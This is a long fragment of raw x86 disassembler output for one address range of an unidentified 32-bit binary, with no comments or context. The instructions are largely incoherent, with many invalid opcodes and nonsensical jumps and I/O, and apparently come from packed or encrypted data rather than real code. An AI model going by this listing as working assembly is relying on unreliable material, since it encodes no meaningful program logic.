  40e990:	pop    esp
  40e991:	mov    DWORD PTR [ebx+0x61],esp
  40e994:	sbb    BYTE PTR [edx],0x88
  40e997:	xlat   BYTE PTR ds:[ebx]
  40e998:	mov    dl,0xc9
  40e99a:	outs   dx,DWORD PTR ds:[esi]
  40e99b:	sbb    edx,DWORD PTR [ebx-0x1e20b63f]
  40e9a1:	mov    es,ebp
  40e9a3:	lds    ecx,FWORD PTR [ebx]
  40e9a5:	jb     0x40e9d3
  40e9a7:	mov    ebp,0x6d3157a6
  40e9ac:	cmp    esp,DWORD PTR [edx-0x51649297]
  40e9b2:	inc    ecx
  40e9b3:	test   BYTE PTR [edi-0x5d9c6922],dh
  40e9b9:	scas   al,BYTE PTR es:[edi]
  40e9ba:	add    DWORD PTR [ecx+0x7dbb90d3],edx
  40e9c0:	pop    esp
  40e9c1:	call   FWORD PTR [edx+0x73ff66ca]
  40e9c7:	and    al,bh
  40e9c9:	ds push es
  40e9cb:	stos   DWORD PTR es:[edi],eax
  40e9cc:	pop    esp
  40e9cd:	bound  ebp,QWORD PTR [edx-0x1]
  40e9d0:	pop    eax
  40e9d1:	push   0x4f5f4ee2
  40e9d6:	ror    DWORD PTR [ebp+0x45d37e21],cl
  40e9dc:	and    ebp,DWORD PTR [ecx-0x1dc965d6]
  40e9e2:	cmp    dl,BYTE PTR [esi-0xa]
  40e9e5:	xor    bh,BYTE PTR [esi+0x16]
  40e9e8:	push   ss
  40e9e9:	retf   
  40e9ea:	ja     0x40ea4f
  40e9ec:	leave  
  40e9ed:	cli    
  40e9ee:	mov    al,ds:0xe5af2b2b
  40e9f3:	xchg   esp,eax
  40e9f4:	pushf  
  40e9f5:	mov    ecx,esi
  40e9f7:	adc    edx,DWORD PTR [ebx+0x6a]
  40e9fa:	sbb    ebp,ebx
  40e9fc:	mov    cl,0xb
  40e9fe:	push   0x3f
  40ea00:	mov    fs,WORD PTR [esi-0x10]
  40ea03:	mov    ch,0x71
  40ea05:	jbe    0x40ea2f
  40ea07:	test   al,0xae
  40ea09:	retf   
  40ea0a:	mov    edi,0xe3983e77
  40ea0f:	jmp    0x40ea29
  40ea11:	inc    ecx
  40ea12:	loop   0x40e9ad
  40ea14:	and    bh,BYTE PTR [edx+0x38898b7f]
  40ea1a:	cmp    ecx,eax
  40ea1c:	cmp    BYTE PTR [edx-0x27],ch
  40ea1f:	lods   eax,DWORD PTR ds:[esi]
  40ea20:	push   0xffffff8f
  40ea22:	stc    
  40ea23:	repz add BYTE PTR [edx],cl
  40ea26:	add    DWORD PTR [eax-0x2606c542],0xf
  40ea2d:	mov    edx,0xc8e6d11f
  40ea32:	cmp    eax,0x6111b298
  40ea37:	clc    
  40ea38:	jbe    0x40e9f1
  40ea3a:	repz out 0x16,eax
  40ea3d:	into   
  40ea3e:	or     eax,0x6e368356
  40ea43:	gs jbe 0x40e9da
  40ea46:	into   
  40ea47:	popf   
  40ea48:	out    0xb7,eax
  40ea4a:	mov    cl,0x6
  40ea4c:	jcxz   0x40ea29
  40ea4f:	add    esp,DWORD PTR [ebx+0x4e]
  40ea52:	jns    0x40eaad
  40ea54:	aad    0xf7
  40ea56:	push   0x2e
  40ea58:	pop    edx
  40ea59:	mov    edx,0x92b38b58
  40ea5e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea5f:	jge    0x40ea3a
  40ea61:	adc    dh,0x61
  40ea64:	mov    ds:0xbf899183,eax
  40ea69:	shl    DWORD PTR [ecx-0x5fe264ef],cl
  40ea6f:	(bad)  
  40ea70:	out    dx,al
  40ea71:	mov    dh,bl
  40ea73:	retf   0x4fe4
  40ea76:	push   edx
  40ea77:	sbb    bh,BYTE PTR [ebx-0x769d03c7]
  40ea7d:	mov    bl,0xf7
  40ea7f:	jmp    0x40ea1f
  40ea81:	into   
  40ea82:	test   eax,0x1160298a
  40ea87:	push   DWORD PTR [ecx+edi*4]
  40ea8a:	retw   
  40ea8c:	mov    bl,BYTE PTR [edx+0x45]
  40ea8f:	aam    0x6a
  40ea91:	aaa    
  40ea92:	xchg   ecx,eax
  40ea93:	pop    ecx
  40ea94:	movd   DWORD PTR [edi+0x7c646c40],mm3
  40ea9b:	mov    al,0x8b
  40ea9d:	jb     0x40ea23
  40ea9f:	fwait
  40eaa0:	(bad)  
  40eaa2:	pop    esi
  40eaa3:	aaa    
  40eaa4:	inc    edx
  40eaa5:	repz in al,dx
  40eaa7:	pusha  
  40eaa8:	xchg   ecx,eax
  40eaa9:	sbb    esp,DWORD PTR [ebx+ebx*1]
  40eaac:	in     eax,dx
  40eaad:	jmp    0xecd0f3dd
  40eab2:	js     0x40ea71
  40eab4:	and    eax,0x9b3fa384
  40eab9:	dec    esi
  40eaba:	jle    0x40ea41
  40eabc:	jb     0x40eb06
  40eabe:	push   ecx
  40eabf:	push   ss
  40eac0:	jmp    0x40ead0
  40eac2:	mov    esi,DWORD PTR [ebx+0x60]
  40eac5:	int    0xec
  40eac7:	mov    edx,0xdad23ce3
  40eacc:	dec    edx
  40eacd:	cs jmp 0x2b10:0x2659d8b
  40ead5:	sub    BYTE PTR [ebp+eiz*4-0x14],ah
  40ead9:	mov    bl,bl
  40eadb:	mov    ecx,0x755b8981
  40eae0:	cmp    BYTE PTR [esi+eiz*4-0x3a2f8bf2],dh
  40eae7:	mov    esp,0x1d60df42
  40eaec:	add    dh,cl
  40eaee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eaef:	(bad)
  40eaf2:	aam    0x1e
  40eaf4:	dec    ebp
  40eaf5:	iret   
  40eaf6:	or     al,0x9d
  40eaf8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eaf9:	and    edi,0x2ce5f77b
  40eaff:	ja     0x40eae9
  40eb01:	fdiv   st,st(2)
  40eb03:	cmp    ebp,DWORD PTR [ebx-0x4f]
  40eb06:	shl    BYTE PTR [esi],cl
  40eb08:	stos   DWORD PTR es:[edi],eax
  40eb09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eb0a:	cmp    bh,bl
  40eb0c:	lods   al,BYTE PTR ds:[esi]
  40eb0d:	pop    ecx
  40eb0e:	sbb    eax,0xd3546f96
  40eb13:	into   
  40eb14:	mov    ch,0xda
  40eb16:	(bad)  
  40eb17:	or     al,0x65
  40eb19:	nop
  40eb1a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eb1b:	push   ss
  40eb1c:	xchg   ebx,eax
  40eb1d:	ret    
  40eb1e:	pop    ds
  40eb1f:	pop    ebp
  40eb20:	pop    ecx
  40eb21:	mov    dl,0xc
  40eb23:	stc    
  40eb24:	inc    edi
  40eb25:	das    
  40eb26:	ret    
  40eb27:	(bad)  
  40eb28:	fcomp  st(5)
  40eb2a:	iret   
  40eb2b:	cli    
  40eb2c:	hlt    
  40eb2d:	add    ecx,DWORD PTR [ebp-0x1f5f8636]
  40eb33:	je     0x40ead4
  40eb35:	jbe    0x40ebae
  40eb37:	fld    DWORD PTR [ecx+0x5a57a71e]
  40eb3d:	or     ch,cl
  40eb3f:	popf   
  40eb40:	mov    eax,ds:0xb1f85024
  40eb45:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb46:	xchg   esp,eax
  40eb47:	mov    ecx,0x8e1f423d
  40eb4c:	test   al,0x80
  40eb4e:	cwde   
  40eb4f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40eb50:	popa   
  40eb51:	iret   
  40eb52:	adc    esp,DWORD PTR [eax-0x58]
  40eb55:	in     al,dx
  40eb56:	mov    ds:0xdd0f81bc,al
  40eb5b:	mov    ch,0x2e
  40eb5d:	lea    esi,[esi-0x7ee606fa]
  40eb63:	es push esi
  40eb65:	xor    DWORD PTR [edx-0x785212e5],edi
  40eb6b:	fnstsw WORD PTR [ebx-0x54]
  40eb6e:	dec    edx
  40eb6f:	sti    
  40eb70:	outs   dx,DWORD PTR ds:[esi]
  40eb71:	hlt    
  40eb72:	sbb    BYTE PTR [edi+0x64],dl
  40eb75:	push   eax
  40eb76:	ins    DWORD PTR es:[edi],dx
  40eb77:	in     al,0xb
  40eb79:	mov    DWORD PTR [edi],esp
  40eb7b:	cmp    esp,esi
  40eb7d:	xor    edi,DWORD PTR [edx+0x5b405507]
  40eb83:	aad    0xf2
  40eb85:	mov    esp,?
  40eb87:	jp     0x40eb22
  40eb89:	enter  0xd361,0x38
  40eb8d:	call   0x5f8d854b
  40eb92:	loopne 0x40ec13
  40eb94:	loope  0x40ec08
  40eb96:	mov    eax,0x3887099a
  40eb9b:	jb     0x40ec0f
  40eb9d:	sub    bl,0xfa
  40eba0:	mov    ?,WORD PTR ds:0xd9d79667
  40eba6:	xchg   esp,eax
  40eba7:	pop    edx
  40eba8:	shl    eax,cl
  40ebaa:	sbb    al,0xc5
  40ebac:	lods   al,BYTE PTR ds:[esi]
  40ebad:	ret    0x72e0
  40ebb0:	jo     0x40eb90
  40ebb2:	dec    esi
  40ebb3:	pop    ebx
  40ebb4:	adc    BYTE PTR es:[ebx-0xb],bh
  40ebb8:	xlat   BYTE PTR ds:[ebx]
  40ebb9:	xor    ebp,DWORD PTR [edx+ecx*1-0x34b6d681]
  40ebc0:	daa    
  40ebc1:	arpl   WORD PTR [ecx],cx
  40ebc3:	dec    ebp
  40ebc4:	dec    ecx
  40ebc5:	push   ss
  40ebc6:	nop
  40ebc7:	mov    ah,0x7b
  40ebc9:	popa   
  40ebca:	or     BYTE PTR [eax],bh
  40ebcc:	push   eax
  40ebcd:	imul   eax,DWORD PTR [ecx],0x9ac7c73e
  40ebd3:	pop    ebx
  40ebd4:	xchg   esi,eax
  40ebd5:	mov    ds:0x7952233a,eax
  40ebda:	shl    BYTE PTR [ecx-0x54131af3],0xf3
  40ebe1:	push   ss
  40ebe2:	or     ebp,ebx
  40ebe4:	mov    ebp,0x5a13cd6
  40ebe9:	rcl    bl,0x77
  40ebec:	sbb    edi,esp
  40ebee:	push   ebx
  40ebef:	jns    0x40ebb8
  40ebf1:	xor    DWORD PTR [eax-0xe35e6bf],ecx
  40ebf7:	push   esp
  40ebf8:	cmp    bh,BYTE PTR [ebx-0x4026556e]
  40ebfe:	pop    ss
  40ebff:	inc    eax
  40ec00:	pop    ebp
  40ec01:	cmc    
  40ec02:	ins    DWORD PTR es:[edi],dx
  40ec03:	push   esi
  40ec04:	push   ebp
  40ec05:	cmp    al,0xa0
  40ec07:	loop   0x40ebee
  40ec09:	cli    
  40ec0a:	shl    DWORD PTR [edi],1
  40ec0c:	xor    cl,al
  40ec0e:	push   ecx
  40ec0f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ec10:	dec    ebx
  40ec11:	xor    al,0x4e
  40ec13:	push   0xe6b05e22
  40ec18:	cmp    DWORD PTR [edi-0x606476ce],ecx
  40ec1e:	sub    eax,DWORD PTR [ecx]
  40ec20:	sbb    DWORD PTR [edx-0x7ad228ed],ebx
  40ec26:	shr    DWORD PTR [ebx+0x2a782b77],1
  40ec2c:	(bad)  
  40ec2d:	loopne 0x40ec77
  40ec2f:	pop    edx
  40ec30:	jne    0x40ec72
  40ec32:	jg     0x40ec71
  40ec34:	lock sahf 
  40ec36:	hlt    
  40ec37:	ds mov cl,0x7a
  40ec3a:	lahf   
  40ec3b:	pop    edi
  40ec3c:	and    dh,BYTE PTR [edx]
  40ec3e:	loope  0x40ec32
  40ec40:	cs push ebp
  40ec42:	je     0x40ec9a
  40ec44:	call   0xdb8e:0xea12ddbb
  40ec4b:	mov    bh,BYTE PTR [esp+eax*8]
  40ec4e:	adc    BYTE PTR [edi],0xfa
  40ec51:	xor    ch,dh
  40ec53:	xchg   esp,eax
  40ec54:	mov    ds:0x96a18a45,eax
  40ec59:	(bad)  
  40ec5a:	aaa    
  40ec5b:	sub    DWORD PTR [ebx+0x36b04a1d],edi
  40ec61:	test   BYTE PTR [ebp-0x6a448089],dl
  40ec67:	mov    BYTE PTR [esi+0xba018fe],bl
  40ec6d:	out    dx,eax
  40ec6e:	cmp    edi,edi
  40ec70:	(bad)  
  40ec72:	jecxz  0x40ec43
  40ec74:	in     al,0x3e
  40ec76:	xlat   BYTE PTR ds:[ebx]
  40ec77:	xor    eax,0x5107480
  40ec7c:	scas   al,BYTE PTR es:[edi]
  40ec7d:	pop    ss
  40ec7e:	pop    ecx
  40ec7f:	out    0x17,al
  40ec81:	mov    cl,0xe
  40ec83:	adc    eax,0xa7ca8765
  40ec88:	dec    eax
  40ec89:	jge    0x40ed01
  40ec8b:	xchg   ebx,eax
  40ec8c:	mov    ebp,0xe4aa937a
  40ec91:	lods   eax,DWORD PTR ds:[esi]
  40ec92:	ret    0x2889
  40ec95:	js     0x40ecbd
  40ec97:	fwait
  40ec98:	outs   dx,DWORD PTR ds:[esi]
  40ec99:	in     eax,dx
  40ec9a:	iret   
  40ec9b:	mov    bl,0x6c
  40ec9d:	jl     0x40ec47
  40ec9f:	fdivr  DWORD PTR fs:[edi]
  40eca2:	shl    ebx,1
  40eca4:	cmp    DWORD PTR [ebx+0x53],0xffffffef
  40eca8:	add    al,BYTE PTR [edx]
  40ecaa:	or     BYTE PTR [ecx-0x1ed053e6],cl
  40ecb0:	pop    eax
  40ecb1:	cmp    esi,DWORD PTR [ebp-0x7a10f854]
  40ecb7:	add    eax,0x10544a52
  40ecbc:	in     eax,dx
  40ecbd:	cmp    dh,cl
  40ecbf:	ret    
  40ecc0:	jge    0x40ed3b
  40ecc2:	xor    BYTE PTR [edx+0x6],cl
  40ecc5:	inc    ecx
  40ecc6:	(bad)  
  40ecc8:	jne    0x40ed1a
  40ecca:	sar    DWORD PTR [ecx],1
  40eccc:	dec    ecx
  40eccd:	pop    ebx
  40ecce:	sbb    dl,BYTE PTR [edi+0x73]
  40ecd1:	(bad)  
  40ecd2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ecd3:	dec    edi
  40ecd4:	adc    al,0xed
  40ecd6:	dec    ebx
  40ecd7:	ret    
  40ecd8:	ds cli 
  40ecda:	ins    BYTE PTR es:[edi],dx
  40ecdb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ecdc:	scas   eax,DWORD PTR es:[edi]
  40ecdd:	mov    ebp,edi
  40ecdf:	sub    DWORD PTR [eax],ecx
  40ece1:	adc    al,0xcb
  40ece3:	adc    cl,BYTE PTR [esi+ebx*2]
  40ece6:	push   es
  40ece7:	ret    0xc55f
  40ecea:	pop    ebx
  40eceb:	ja     0x40ec71
  40eced:	or     BYTE PTR [ecx+0x5f61419b],al
  40ecf3:	mov    esi,DWORD PTR [ecx+0x9]
  40ecf6:	jp     0x40ecad
  40ecf8:	das    
  40ecf9:	mov    edi,0xc649704e
  40ecfe:	or     al,0x1e
  40ed00:	sub    DWORD PTR [eax-0x4a88172d],edx
  40ed06:	jnp    0x40ec9e
  40ed08:	fxch   st(5)
  40ed0a:	popf   
  40ed0b:	fisttp QWORD PTR [esi+ebp*2]
  40ed0e:	mov    cl,0x1a
  40ed10:	add    al,0x9d
  40ed12:	icebp  
  40ed13:	inc    edx
  40ed14:	(bad)  
  40ed16:	fdivr  DWORD PTR [edi+esi*1+0x6c]
  40ed1a:	imul   edx,esp,0x21
  40ed1d:	mov    WORD PTR [esi-0x33],es
  40ed20:	fwait
  40ed21:	push   esp
  40ed22:	les    edx,FWORD PTR [ecx+0x40de3679]
  40ed28:	cmp    DWORD PTR [esi+0x40c4e7f],esi
  40ed2e:	shr    DWORD PTR [edx-0x5b],0xa0
  40ed32:	scas   eax,DWORD PTR es:[edi]
  40ed33:	and    al,0x6d
  40ed35:	fistp  QWORD PTR [edi]
  40ed37:	bound  ecx,QWORD PTR [ebx]
  40ed39:	hlt    
  40ed3a:	jo     0x40ed26
  40ed3c:	xchg   ecx,eax
  40ed3d:	daa    
  40ed3e:	and    eax,DWORD PTR [edi-0x532aa718]
  40ed44:	sbb    BYTE PTR [ecx],0x2
  40ed47:	(bad)  
  40ed48:	and    DWORD PTR [esi-0x1073cf45],0xb858dec3
  40ed52:	es or  ah,ch
  40ed55:	cdq    
  40ed56:	pslld  mm5,QWORD PTR [eax-0xe]
  40ed5a:	int    0x78
  40ed5c:	jmp    0x88ed:0x870cfede
  40ed63:	push   cs
  40ed64:	mov    DWORD PTR [ebx+0x303cc4c4],edx
  40ed6a:	mov    al,BYTE PTR [ebx+0x3916cbdb]
  40ed70:	mov    bl,0xeb
  40ed72:	fsub   DWORD PTR [ecx]
  40ed74:	xchg   esp,eax
  40ed75:	in     al,dx
  40ed76:	das    
  40ed77:	loope  0x40ed13
  40ed79:	loopne 0x40edc4
  40ed7b:	dec    edx
  40ed7c:	adc    ch,ah
  40ed7e:	mov    DWORD PTR [edx-0x601f47f],ebp
  40ed84:	rcr    BYTE PTR [edx+0x60],1
  40ed87:	xchg   ecx,eax
  40ed88:	dec    ecx
  40ed89:	retf   
  40ed8a:	adc    al,0x88
  40ed8c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ed8d:	mov    ecx,0x480eba78
  40ed92:	aad    0x51
  40ed94:	shl    BYTE PTR [ebx+0x3fa44da0],1
  40ed9a:	jl     0x40ed2e
  40ed9c:	shl    esi,cl
  40ed9e:	mov    cl,0x3f
  40eda0:	pop    DWORD PTR [edx+0x5641cbbe]
  40eda6:	daa    
  40eda7:	fxch   st(4)
  40eda9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40edaa:	leave  
  40edab:	and    BYTE PTR [eax-0x2d],bh
  40edae:	pusha  
  40edaf:	mov    DWORD PTR [edx+0x25],eax
  40edb2:	mov    esi,0xc05457c4
  40edb7:	mov    ds:0xd036f7da,eax
  40edbc:	cmp    BYTE PTR [edi+0xf2073bf],0xaa
  40edc3:	int3   
  40edc4:	xchg   BYTE PTR [edi+0x217810f],bh
  40edca:	push   esp
  40edcb:	jmp    0x40ed54
  40edcd:	push   esp
  40edce:	lods   eax,DWORD PTR ds:[esi]
  40edcf:	dec    ebx
  40edd0:	shl    BYTE PTR [edx+0x45],cl
  40edd3:	mov    eax,ds:0xaf5c58c8
  40edd8:	and    DWORD PTR ds:0xdbf11ef5,ebx
  40eddf:	jl     0x40ed78
  40ede1:	push   ecx
  40ede2:	or     ah,BYTE PTR [edx-0x353a1f96]
  40ede8:	xor    dh,BYTE PTR [ecx+0x53]
  40edeb:	xor    eax,0xba2187b1
  40edf0:	cs or  eax,0x99f945a9
  40edf6:	xor    DWORD PTR [ebx-0x55e8fe3e],ecx
  40edfc:	xbegin 0xd43f3cd
  40ee02:	imul   BYTE PTR [edi+0x728d27a6]
  40ee08:	dec    eax
  40ee09:	ds xchg esi,eax
  40ee0b:	(bad)  
  40ee0c:	out    dx,al
  40ee0d:	jnp    0x40ee24
  40ee0f:	mov    ds:0x6e21bd88,al
  40ee14:	add    eax,0x250a2f78
  40ee19:	int3   
  40ee1a:	aaa    
  40ee1b:	mov    edi,0xc053fa7e
  40ee20:	and    ebp,DWORD PTR [edx+0x6b]
  40ee23:	fmul   st(0),st
  40ee25:	addr16 mov dh,0x55
  40ee28:	cli    
  40ee29:	stos   BYTE PTR es:[edi],al
  40ee2a:	je     0x40ee96
  40ee2c:	out    0xa0,al
  40ee2e:	clc    
  40ee2f:	out    0x28,eax
  40ee31:	mov    dh,BYTE PTR [eax]
  40ee33:	retf   
  40ee34:	push   eax
  40ee35:	push   0xdcfa6e92
  40ee3a:	pop    ds
  40ee3b:	std    
  40ee3c:	aam    0x92
  40ee3e:	sbb    dh,BYTE PTR [edx+0x2ce5ab56]
  40ee44:	aas    
  40ee45:	imul   BYTE PTR [ebx+0x75039722]
  40ee4b:	hlt    
  40ee4c:	scas   eax,DWORD PTR es:[edi]
  40ee4d:	mov    edi,0x2ad3cf47
  40ee52:	pop    ecx
  40ee53:	mov    bl,0x5f
  40ee55:	push   ds
  40ee56:	shr    BYTE PTR [ebx+0x63],1
  40ee59:	pop    ebx
  40ee5a:	xor    al,0x5f
  40ee5c:	mov    edx,0xf7e5c60c
  40ee61:	mov    ebp,0x17583a0
  40ee66:	mov    ds:0xe2fdf4b7,eax
  40ee6b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ee6c:	out    dx,eax
  40ee6d:	clc    
  40ee6e:	jno    0x40ee21
  40ee70:	(bad)  [eax-0x565e8587]
  40ee76:	pusha  
  40ee77:	dec    edi
  40ee78:	ins    BYTE PTR es:[edi],dx
  40ee79:	frstor [edx+0x4c]
  40ee7c:	cmp    eax,0x28bbe5f9
  40ee81:	and    al,0x6a
  40ee83:	lahf   
  40ee84:	jb     0x40eea3
  40ee86:	xchg   edi,eax
  40ee87:	or     cl,BYTE PTR [ebx+0x69b8a083]
  40ee8d:	mov    esi,0x6353911c
  40ee92:	pop    eax
  40ee93:	add    bh,bh
  40ee95:	inc    esp
  40ee96:	hlt    
  40ee97:	(bad)  
  40ee98:	xchg   esp,eax
  40ee99:	mov    bh,0xac
  40ee9b:	iret   
  40ee9c:	jae    0x40ee70
  40ee9e:	imul   bh
  40eea0:	(bad)  
  40eea1:	fdivr  QWORD PTR [esi]
  40eea3:	pop    ss
  40eea4:	jno    0x40eef7
  40eea6:	dec    edi
  40eea7:	adc    DWORD PTR [eax-0x61317117],edi
  40eead:	out    0x5a,al
  40eeaf:	test   al,0x64
  40eeb1:	jns    0x40eeba
  40eeb3:	jb     0x40eed8
  40eeb5:	test   eax,0x602127b4
  40eeba:	sar    BYTE PTR [esi+0x6fe581e0],1
  40eec0:	sbb    ebx,ebp
  40eec2:	into   
  40eec3:	sub    al,0xb7
  40eec5:	dec    edi
  40eec6:	xor    BYTE PTR [edi+edx*1],al
  40eec9:	mov    ebp,0x1bd4bad5
  40eece:	lea    ecx,[ecx-0x47]
  40eed1:	mov    ch,0xb4
  40eed3:	dec    edi
  40eed4:	mov    esi,0xa62bf26a
  40eed9:	xor    DWORD PTR [esi-0x25],esi
  40eedc:	jns    0x40ef4f
  40eede:	jnp    0x40eec2
  40eee0:	adc    eax,0x5cd81f86
  40eee5:	fild   DWORD PTR [eax+0x32]
  40eee8:	gs loop 0x40ee75
  40eeeb:	ss add eax,0x7a07e3f8
  40eef1:	cmc    
  40eef2:	xchg   ecx,eax
  40eef3:	into   
  40eef4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40eef5:	cmp    edi,ecx
  40eef7:	and    al,0x54
  40eef9:	fisubr WORD PTR [ecx-0x3491bd39]
  40eeff:	inc    edx
  40ef00:	lock inc ecx
  40ef02:	call   0xa20d:0xa92ec3d8
  40ef09:	pushw  ds
  40ef0b:	dec    edx
  40ef0c:	cs fcmovu st,st(5)
  40ef0f:	push   esi
  40ef10:	xchg   esp,eax
  40ef11:	xchg   esp,eax
  40ef12:	xchg   esp,eax
  40ef13:	pop    edx
  40ef14:	mov    al,ds:0x66f2d64c
  40ef19:	(bad)
  40ef1c:	mov    ecx,0xda0d609f
  40ef21:	or     ebp,edi
  40ef23:	xlat   BYTE PTR ds:[ebx]
  40ef24:	pinsrw mm6,WORD PTR [eax+esi*4],0xf4
  40ef29:	mov    ah,0x60
  40ef2b:	or     ebx,DWORD PTR [eax+eiz*4]
  40ef2e:	adc    BYTE PTR [edx-0x22a1a736],dl
  40ef34:	call   0xa03e:0x41d13c44
  40ef3b:	shl    BYTE PTR [ebx-0x180ffa59],0x14
  40ef42:	xor    BYTE PTR [ebp-0x7b],cl
  40ef45:	frstorw [edx-0x29]
  40ef49:	mov    ebp,0x4ae37393
  40ef4e:	sub    DWORD PTR [eax+ebx*4+0x7f],0x58
  40ef53:	push   esi
  40ef54:	in     al,dx
  40ef55:	call   0x3fa2:0x3c9e1420
  40ef5c:	mov    edi,0xc133124b
  40ef61:	daa    
  40ef62:	pop    eax
  40ef63:	sub    eax,0xcc6a515c
  40ef68:	xor    eax,0xfd0fc9de
  40ef6d:	jp     0x40ef49
  40ef6f:	mov    ecx,0x99a95aa5
  40ef74:	or     DWORD PTR [eax],esi
  40ef76:	imul   edi,DWORD PTR [ecx],0xffffff9e
  40ef79:	(bad)  
  40ef7b:	jo     0x40ef87
  40ef7d:	pop    esp
  40ef7e:	jecxz  0x40efb0
  40ef80:	daa    
  40ef81:	jge    0x40ef94
  40ef83:	jo     0x40efe6
  40ef85:	ficomp DWORD PTR [ebx-0x7d]
  40ef88:	stos   DWORD PTR es:[edi],eax
  40ef89:	ins    BYTE PTR es:[edi],dx
  40ef8a:	push   esi
  40ef8b:	ins    DWORD PTR es:[edi],dx
  40ef8c:	and    DWORD PTR ds:0xa89406ca,0x6fb85fac
  40ef96:	or     DWORD PTR [eax+0xdf135c2],edi
  40ef9c:	pushf  
  40ef9d:	mov    esi,0xe21536a6
  40efa2:	xor    al,0xd
  40efa4:	in     eax,dx
  40efa5:	mov    ebx,DWORD PTR [edi-0x3d]
  40efa8:	push   ebp
  40efa9:	ja     0x40ef43
  40efab:	inc    ebp
  40efac:	arpl   WORD PTR [eax-0x39],di
  40efaf:	jmp    0x40ef43
  40efb1:	push   ebx
  40efb2:	sar    edi,1
  40efb4:	sub    al,0x4f
  40efb6:	jl     0x40efab
  40efb8:	cli    
  40efb9:	sub    al,BYTE PTR [edi-0xa]
  40efbc:	ss push ds
  40efbe:	enter  0xcd1a,0x53
  40efc2:	jbe    0x40f024
  40efc4:	push   ebx
  40efc5:	lds    esp,FWORD PTR [esp+eiz*2+0x498889b3]
  40efcc:	jg     0x40f03e
  40efce:	adc    ah,dl
  40efd0:	sub    DWORD PTR [ebp-0x46],edi
  40efd3:	dec    esp
  40efd4:	add    DWORD PTR [esp+ebp*8],ebx
  40efd7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40efd8:	fidivr WORD PTR ds:0x9cf6de0
  40efde:	cwde   
  40efdf:	xor    al,0xe6
  40efe1:	jnp    0x40f016
  40efe3:	adc    esp,DWORD PTR [ecx]
  40efe5:	int3   
  40efe6:	push   edi
  40efe7:	add    DWORD PTR [ebx-0x175d0ffb],0xa036d98a
  40eff1:	or     DWORD PTR [eax-0x728a4d5],edx
  40eff7:	adc    al,0x86
  40eff9:	je     0x40f010
  40effb:	leave  
  40effc:	jb     0x40f02e
  40effe:	pusha  
  40efff:	jae    0x40f02d
  40f001:	jp     0x40f06f
  40f003:	pop    eax
  40f004:	fist   DWORD PTR [ecx]
  40f006:	ror    DWORD PTR [esp-0x8dec880],0x38
  40f00e:	loop   0x40f089
  40f010:	xor    eax,0x818ed026
  40f015:	loop   0x40f06a
  40f017:	or     al,0x65
  40f019:	mov    esi,0x6cf4ef37
  40f01e:	inc    edx
  40f01f:	xor    ebx,DWORD PTR [edi-0x5afb6ef7]
  40f025:	xor    bl,BYTE PTR [edi-0x16]
  40f028:	or     BYTE PTR [esi],al
  40f02a:	dec    esi
  40f02b:	and    al,0x5d
  40f02d:	mov    ecx,0x8b679872
  40f032:	es or  dl,bh
  40f035:	jnp    0x40efbe
  40f037:	pushf  
  40f038:	or     eax,0x2f83087f
  40f03d:	sub    DWORD PTR [esi-0x3c660ed1],0xffffffff
  40f044:	hlt    
  40f045:	rol    BYTE PTR [edi-0x75ebcc2a],cl
  40f04b:	or     al,0x92
  40f04d:	adc    esi,ebx
  40f04f:	fwait
  40f050:	scas   al,BYTE PTR es:[edi]
  40f051:	imul   ebx,DWORD PTR [ecx+0x3ed80552],0x7f889261
  40f05b:	mov    cl,0x23
  40f05d:	sbb    DWORD PTR [esi],eax
  40f05f:	out    dx,eax
  40f060:	dec    ecx
  40f061:	mov    ecx,0xf06c75dd
  40f066:	dec    esp
  40f067:	pop    esp
  40f068:	mov    DWORD PTR [edx+0x71],esp
  40f06b:	ror    BYTE PTR [eax-0x70cfa894],0x64
  40f072:	sub    DWORD PTR [esi+0x56],esi
  40f075:	dec    edi
  40f076:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f077:	cli    
  40f078:	bound  ebp,QWORD PTR [edx-0x21]
  40f07b:	test   eax,0xef758ca1
  40f080:	mov    ebp,esi
  40f082:	and    eax,0xda63b165
  40f087:	(bad)  [esi-0x7b4d1de8]
  40f08d:	dec    ebx
  40f08e:	out    dx,al
  40f08f:	aaa    
  40f090:	jae    0x40f0ab
  40f092:	ins    DWORD PTR es:[edi],dx
  40f093:	add    ebp,DWORD PTR [eax+0x3f075668]
  40f099:	pushf  
  40f09a:	into   
  40f09b:	shl    edx,1
  40f09d:	fcmovnu st,st(4)
  40f09f:	fiadd  WORD PTR ds:0xb8a8001a
  40f0a5:	(bad)  [ecx]
  40f0a7:	outs   dx,BYTE PTR ds:[esi]
  40f0a8:	stos   DWORD PTR es:[edi],eax
  40f0a9:	fcmovb st,st(5)
  40f0ab:	je     0x40f0fb
  40f0ad:	mov    eax,0x29962995
  40f0b2:	pop    ecx
  40f0b3:	daa    
  40f0b4:	fldpi  
  40f0b6:	pushf  
  40f0b7:	fisttp WORD PTR [edi-0x25]
  40f0ba:	jns    0x40f0bd
  40f0bc:	xor    esp,ebp
  40f0be:	je     0x40f0c5
  40f0c0:	push   es
  40f0c1:	test   DWORD PTR [ebx+0x74],eax
  40f0c4:	cs xor bh,dl
  40f0c7:	sub    al,ch
  40f0c9:	jmp    0x9ee3edf0
  40f0ce:	mov    eax,0xc3e17a0b
  40f0d3:	cmp    DWORD PTR [edx-0x212a5ade],esp
  40f0d9:	add    al,0xbe
  40f0dc:	scas   al,BYTE PTR es:[edi]
  40f0dd:	push   ds
  40f0de:	xlat   BYTE PTR ds:[ebx]
  40f0df:	or     ebp,esp
  40f0e1:	loope  0x40f068
  40f0e3:	js     0x40f10f
  40f0e5:	inc    ebp
  40f0e6:	bound  edi,QWORD PTR [eax]
  40f0e8:	mov    ds:0xda22b28c,eax
